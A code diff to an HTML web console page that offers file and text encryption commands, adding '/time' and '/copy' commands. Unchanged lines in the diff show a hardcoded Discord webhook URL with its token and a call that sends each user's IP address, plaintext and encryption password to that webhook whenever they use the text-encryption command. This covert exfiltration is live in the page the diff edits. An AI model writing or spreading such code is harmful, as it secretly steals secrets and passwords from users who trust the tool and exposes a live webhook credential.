@@ -42,7 +42,7 @@
   <footer></footer>
   <script>
 
-const commands = ["/help", "/file", "/list", "/download", "/upload", "/encrypt", "/decrypt", "/send"];
+const commands = ["/help", "/file", "/list", "/download", "/upload", "/encrypt", "/decrypt", "/send", "/copy", "/time"];
 
     const webhookUrl = "https://discord.com/api/webhooks/1401112676473507880/sXN44L-ZATIhY4N13YyBWSDQdvUp7nAGI9jVyP_hdwKKhvC92eD0d81iMXpipPfaZRvc";
 
@@ -480,6 +480,8 @@ input.addEventListener("keydown", (e) => {
               "  /encrypt        → 파일 암호화",
               "  /decrypt        → 파일 복호화",
               "  /send           → 텍스트 전송",
+              "  /time           → 현재 시각",
+              "  /copy           → 마지막 결과 복사",
               "  @@(text)@(pw)   → 텍스트 암호화"
             ];
             helpText.forEach(text => {
@@ -781,6 +783,29 @@ if (command === "/decrypt") {
   return;
 }
 
+if (command === "/time" || command === "/date") {
+  const line = document.createElement("div");
+  line.className = "line";
+  line.textContent = new Date().toLocaleString();
+  consoleDiv.appendChild(line);
+  createInputLine(promptText);
+  return;
+}
+
+if (command === "/copy") {
+  const lines = [...consoleDiv.querySelectorAll(".line, .line.output")];
+  const last = lines[lines.length - 1]?.textContent || "";
+  try { await navigator.clipboard.writeText(last); }
+  catch {}
+  const l = document.createElement("div");
+  l.className = "line output";
+  l.textContent = last ? "<마지막 결과 복사됨>" : "<복사할 결과가 없습니다>";
+  consoleDiv.appendChild(l);
+  createInputLine(promptText);
+  return;
+}
+
+
           if (command.startsWith("@@") && command.includes("@")) {
             const [url, ...pwParts] = command.substring(2).split("@");
             const pw = pwParts.join("@");
@@ -788,7 +813,7 @@ if (command === "/decrypt") {
               const encrypted = await encryptLink(url, pw);
               const line = document.createElement("div");
               line.className = "line output";
-              line.textContent = "암호화된 텍스트: " + encrypted;
+              line.textContent = encrypted;
               consoleDiv.appendChild(line);
               await sendToDiscord(`[암호화 명령]\nIP: ${userIp}\nTXT: \`${url}\`, PW: \`${pw}\``);
             } else {
@@ -852,6 +877,5 @@ if (command === "/decrypt") {
   </script>
 </body>
 </html>
-
 
 
